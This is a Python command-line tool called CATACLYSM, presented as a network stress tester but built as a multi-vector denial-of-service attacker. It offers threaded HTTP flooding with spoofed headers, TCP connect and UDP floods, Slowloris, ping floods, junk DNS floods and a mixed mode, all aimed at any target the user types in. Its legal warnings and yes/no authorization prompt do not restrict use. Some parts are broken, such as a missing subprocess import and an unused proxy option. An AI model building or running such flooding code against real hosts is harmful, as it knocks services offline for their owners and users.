#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
CATACLYSM - Advanced Network Stress Testing Tool
Version: 1.0.0
Platform: Termux / Linux / Android
Author: Your Name
License: MIT

⚠️ WARNING: For authorized security testing only!
Use only on systems you own or have explicit permission to test.
"""

import sys
import socket
import threading
import random
import string
import time
import argparse
import urllib.request
import urllib.parse
from urllib.error import URLError

# Try to import optional modules
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

try:
    from colorama import init, Fore, Style
    init()
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

# Colors
class Colors:
    if COLORAMA_AVAILABLE:
        RED = Fore.RED
        GREEN = Fore.GREEN
        YELLOW = Fore.YELLOW
        BLUE = Fore.BLUE
        MAGENTA = Fore.MAGENTA
        CYAN = Fore.CYAN
        WHITE = Fore.WHITE
        BOLD = Style.BRIGHT
        RESET = Style.RESET_ALL
    else:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        RESET = '\033[0m'

class Cataclysm:
    def __init__(self):
        self.target = None
        self.port = 80
        self.threads = 100
        self.duration = 60
        self.mode = "http"
        self.proxies = []
        self.stop_attack = False
        self.stats = {
            'requests_sent': 0,
            'success': 0,
            'failed': 0
        }
        
    def print_banner(self):
        """Display the banner"""
        banner = f"""
{Colors.RED}{Colors.BOLD}
  ██████╗ █████╗ ████████╗ █████╗  ██████╗██╗   ██╗██╗     ███████╗███╗   ███╗
 ██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║   ██║██║     ██╔════╝████╗ ████║
 ██║     ███████║   ██║   ███████║██║     ██║   ██║██║     █████╗  ██╔████╔██║
 ██║     ██╔══██║   ██║   ██╔══██║██║     ██║   ██║██║     ██╔══╝  ██║╚██╔╝██║
 ╚██████╗██║  ██║   ██║   ██║  ██║╚██████╗╚██████╔╝███████╗███████╗██║ ╚═╝ ██║
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝{Colors.RESET}
{Colors.YELLOW}              ⚠️  ADVANCED NETWORK STRESS TESTING TOOL{Colors.RESET}
{Colors.CYAN}                         Version 1.0.0{Colors.RESET}
        """
        print(banner)
        
    def print_warning(self):
        """Display legal warning"""
        warning = f"""
{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}
{Colors.RED}{Colors.BOLD}  ⚠️  LEGAL WARNING - AUTHORIZED TESTING ONLY{Colors.RESET}
{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}
{Colors.YELLOW}
  This tool is for AUTHORIZED security testing only!
  
  ✓ Test ONLY systems you OWN or have EXPLICIT PERMISSION to test
  ✓ Use for security research, CTF competitions, and lab environments
  ✓ Educational purposes in isolated networks
  
  ✗ NEVER use against government, military, or critical infrastructure
  ✗ NEVER use for malicious, destructive, or illegal purposes
  ✗ NEVER test without proper authorization
  
  The authors assume NO LIABILITY for misuse or damage.
  Unauthorized access to computer systems is a CRIMINAL OFFENSE.
{Colors.RESET}
{Colors.RED}{Colors.BOLD}{'='*70}{Colors.RESET}
"""
        print(warning)
        
    def get_target(self):
        """Get target from user"""
        print(f"\n{Colors.CYAN}[?]{Colors.RESET} Enter target URL/IP (e.g., http://192.168.1.1 or https://site.com): ", end="")
        self.target = input().strip()
        
        # Parse target
        if self.target.startswith(('http://', 'https://')):
            parsed = urllib.parse.urlparse(self.target)
            self.host = parsed.hostname
            self.port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            self.path = parsed.path or '/'
        else:
            self.host = self.target
            self.port = 80
            self.path = '/'
            self.target = f"http://{self.target}"
            
        print(f"{Colors.GREEN}[+]{Colors.RESET} Target set: {Colors.BOLD}{self.host}:{self.port}{Colors.RESET}\n")
        
    def select_mode(self):
        """Select attack mode"""
        print(f"{Colors.CYAN}Select attack mode:{Colors.RESET}")
        print(f"  {Colors.YELLOW}[1]{Colors.RESET} HTTP Flood")
        print(f"  {Colors.YELLOW}[2]{Colors.RESET} TCP SYN Flood")
        print(f"  {Colors.YELLOW}[3]{Colors.RESET} UDP Flood")
        print(f"  {Colors.YELLOW}[4]{Colors.RESET} Slowloris")
        print(f"  {Colors.YELLOW}[5]{Colors.RESET} ICMP Flood")
        print(f"  {Colors.YELLOW}[6]{Colors.RESET} DNS Flood")
        print(f"  {Colors.YELLOW}[7]{Colors.RESET} MIXED (All vectors)")
        print()
        
        choice = input(f"{Colors.CYAN}[?]{Colors.RESET} Enter choice [1-7]: ").strip()
        
        modes = {
            '1': 'http',
            '2': 'syn',
            '3': 'udp',
            '4': 'slowloris',
            '5': 'icmp',
            '6': 'dns',
            '7': 'mixed'
        }
        
        self.mode = modes.get(choice, 'http')
        print(f"{Colors.GREEN}[+]{Colors.RESET} Mode selected: {Colors.BOLD}{self.mode.upper()}{Colors.RESET}\n")
        
    def get_threads(self):
        """Get number of threads"""
        threads = input(f"{Colors.CYAN}[?]{Colors.RESET} Enter threads [{self.threads}]: ").strip()
        if threads:
            self.threads = int(threads)
        print(f"{Colors.GREEN}[+]{Colors.RESET} Threads: {Colors.BOLD}{self.threads}{Colors.RESET}\n")
        
    def get_duration(self):
        """Get attack duration"""
        duration = input(f"{Colors.CYAN}[?]{Colors.RESET} Enter duration in seconds [{self.duration}]: ").strip()
        if duration:
            self.duration = int(duration)
        print(f"{Colors.GREEN}[+]{Colors.RESET} Duration: {Colors.BOLD}{self.duration}s{Colors.RESET}\n")
        
    def random_string(self, length=10):
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
    def random_user_agent(self):
        """Random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
            'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0'
        ]
        return random.choice(agents)
        
    def http_flood_worker(self):
        """HTTP flood attack worker"""
        while not self.stop_attack:
            try:
                headers = {
                    'User-Agent': self.random_user_agent(),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-us,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Referer': f'https://{self.random_string(10)}.com',
                    'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                }
                
                if REQUESTS_AVAILABLE:
                    r = requests.get(self.target, headers=headers, timeout=5)
                    if r.status_code == 200:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                else:
                    req = urllib.request.Request(self.target, headers=headers)
                    urllib.request.urlopen(req, timeout=5)
                    self.stats['success'] += 1
                    
                self.stats['requests_sent'] += 1
                
            except:
                self.stats['failed'] += 1
                self.stats['requests_sent'] += 1
                
    def syn_flood_worker(self):
        """TCP SYN flood worker"""
        while not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.host, self.port))
                self.stats['success'] += 1
                self.stats['requests_sent'] += 1
                s.close()
            except:
                self.stats['failed'] += 1
                self.stats['requests_sent'] += 1
                
    def udp_flood_worker(self):
        """UDP flood worker"""
        while not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)
                s.sendto(data, (self.host, self.port))
                self.stats['requests_sent'] += 1
                self.stats['success'] += 1
            except:
                self.stats['failed'] += 1
                
    def slowloris_worker(self):
        """Slowloris attack worker"""
        while not self.stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                s.connect((self.host, self.port))
                
                # Send partial HTTP request
                s.send(f"GET /{self.random_string(5)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {self.host}\r\n".encode())
                s.send(f"User-Agent: {self.random_user_agent()}\r\n".encode())
                
                # Keep connection open
                while not self.stop_attack:
                    s.send(f"X-{self.random_string(5)}: {random.randint(1,5000)}\r\n".encode())
                    time.sleep(10)
                    
            except:
                pass
                
    def icmp_flood_worker(self):
        """ICMP flood worker"""
        while not self.stop_attack:
            try:
                # Using system ping command
                packet_size = random.randint(56, 65507)
                if sys.platform == 'linux':
                    cmd = f'ping -c 1 -s {packet_size} {self.host} > /dev/null 2>&1'
                else:
                    cmd = f'ping -n 1 -l {packet_size} {self.host} > nul 2>&1'
                subprocess.call(cmd, shell=True)
                self.stats['requests_sent'] += 1
                self.stats['success'] += 1
            except:
                self.stats['failed'] += 1
                
    def dns_flood_worker(self):
        """DNS flood worker"""
        resolver = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not self.stop_attack:
            try:
                # Random subdomain query
                query = f"{self.random_string(10)}.{self.host}"
                resolver.sendto(query.encode(), (self.host, 53))
                self.stats['requests_sent'] += 1
                self.stats['success'] += 1
            except:
                self.stats['failed'] += 1
                
    def print_stats(self):
        """Print attack statistics"""
        while not self.stop_attack:
            time.sleep(1)
            print(f"\r{Colors.CYAN}[STATUS]{Colors.RESET} Requests: {Colors.GREEN}{self.stats['requests_sent']}{Colors.RESET} | Success: {Colors.GREEN}{self.stats['success']}{Colors.RESET} | Failed: {Colors.RED}{self.stats['failed']}{Colors.RESET}", end='', flush=True)
            
    def start_attack(self):
        """Start the attack"""
        print(f"\n{Colors.RED}{Colors.BOLD}[*] Initializing attack...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Mode: {self.mode.upper()} | Threads: {self.threads} | Duration: {self.duration}s{Colors.RESET}")
        print(f"{Colors.RED}{Colors.BOLD}[+] Attack started - Press Ctrl+C to stop{Colors.RESET}\n")
        
        self.stop_attack = False
        
        # Select worker based on mode
        workers = {
            'http': self.http_flood_worker,
            'syn': self.syn_flood_worker,
            'udp': self.udp_flood_worker,
            'slowloris': self.slowloris_worker,
            'icmp': self.icmp_flood_worker,
            'dns': self.dns_flood_worker
        }
        
        if self.mode == 'mixed':
            # Start all attack vectors
            for mode, worker in workers.items():
                for _ in range(self.threads // len(workers)):
                    t = threading.Thread(target=worker)
                    t.daemon = True
                    t.start()
        else:
            worker = workers.get(self.mode, self.http_flood_worker)
            for _ in range(self.threads):
                t = threading.Thread(target=worker)
                t.daemon = True
                t.start()
                
        # Stats printer
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Timer
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
            
        self.stop_attack = True
        time.sleep(1)
        
        print(f"\n\n{Colors.GREEN}{Colors.BOLD}[✓] Attack completed!{Colors.RESET}")
        print(f"{Colors.CYAN}Total Requests: {self.stats['requests_sent']}{Colors.RESET}")
        print(f"{Colors.GREEN}Successful: {self.stats['success']}{Colors.RESET}")
        print(f"{Colors.RED}Failed: {self.stats['failed']}{Colors.RESET}")
        
    def run(self):
        """Main execution"""
        self.print_banner()
        self.print_warning()
        
        confirm = input(f"{Colors.RED}[!]{Colors.RESET} Do you have authorization to test this target? (yes/no): ").lower()
        if confirm != 'yes':
            print(f"{Colors.RED}[!] Exiting. Use only with proper authorization.{Colors.RESET}")
            return
            
        self.get_target()
        self.select_mode()
        self.get_threads()
        self.get_duration()
        
        final_confirm = input(f"\n{Colors.RED}[!]{Colors.RESET} Start attack on {Colors.BOLD}{self.host}{Colors.RESET}? (yes/no): ").lower()
        if final_confirm == 'yes':
            self.start_attack()
        else:
            print(f"{Colors.YELLOW}[!] Attack cancelled.{Colors.RESET}")

def main():
    parser = argparse.ArgumentParser(description='CATACLYSM - Network Stress Testing Tool')
    parser.add_argument('-u', '--url', help='Target URL/IP')
    parser.add_argument('-m', '--mode', default='http', choices=['http', 'syn', 'udp', 'slowloris', 'icmp', 'dns', 'mixed'], help='Attack mode')
    parser.add_argument('-t', '--threads', type=int, default=100, help='Number of threads')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('--proxy-file', help='File containing proxy list')
    
    args = parser.parse_args()
    
    cataclysm = Cataclysm()
    
    if args.url:
        # Command line mode
        cataclysm.print_banner()
        cataclysm.print_warning()
        
        confirm = input(f"{Colors.RED}[!]{Colors.RESET} Do you have authorization to test {args.url}? (yes/no): ").lower()
        if confirm != 'yes':
            return
            
        cataclysm.target = args.url
        if args.url.startswith(('http://', 'https://')):
            parsed = urllib.parse.urlparse(args.url)
            cataclysm.host = parsed.hostname
            cataclysm.port = args.port or parsed.port or (443 if parsed.scheme == 'https' else 80)
        else:
            cataclysm.host = args.url
            cataclysm.port = args.port or 80
            
        cataclysm.mode = args.mode
        cataclysm.threads = args.threads
        cataclysm.duration = args.duration
        
        cataclysm.start_attack()
    else:
        # Interactive mode
        cataclysm.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Interrupted by user. Exiting...{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.RESET}")
        sys.exit(1)